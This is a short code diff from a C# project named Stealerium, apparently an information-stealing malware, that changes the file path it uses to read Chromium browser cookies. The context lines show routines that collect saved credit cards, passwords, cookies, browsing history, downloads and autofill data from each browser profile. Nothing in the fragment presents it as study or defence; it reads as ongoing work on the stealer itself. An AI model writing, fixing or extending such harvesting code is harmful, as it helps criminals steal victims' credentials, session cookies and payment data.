@@ -233,7 +233,7 @@ namespace Stealerium.Target.Browsers.Chromium
                         // Run tasks
                         var pCreditCards = CreditCards.Get(sProfile + "\\Web Data");
                         var pPasswords = Passwords.Get(sProfile + "\\Login Data");
-                        var pCookies = Cookies.Get(sProfile + "\\Network\\Cookies");
+                        var pCookies = Cookies.Get(sProfile + "\\Cookies");
                         var pHistory = History.Get(sProfile + "\\History");
                         var pDownloads = Downloads.Get(sProfile + "\\History");
                         var pAutoFill = Autofill.Get(sProfile + "\\Web Data");
